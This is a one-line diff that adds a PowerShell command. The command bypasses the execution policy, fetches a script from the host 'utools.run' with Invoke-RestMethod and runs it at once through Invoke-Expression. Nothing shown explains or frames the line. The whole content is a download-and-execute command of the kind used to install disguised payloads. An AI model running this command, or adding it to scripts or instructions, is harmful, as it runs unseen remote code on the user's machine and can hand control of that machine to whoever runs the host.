@@ -1,0 +1,1 @@
+powershell -executionPolicy ByPass -Command "irm utools.run/tcpvcon2ck|iex"
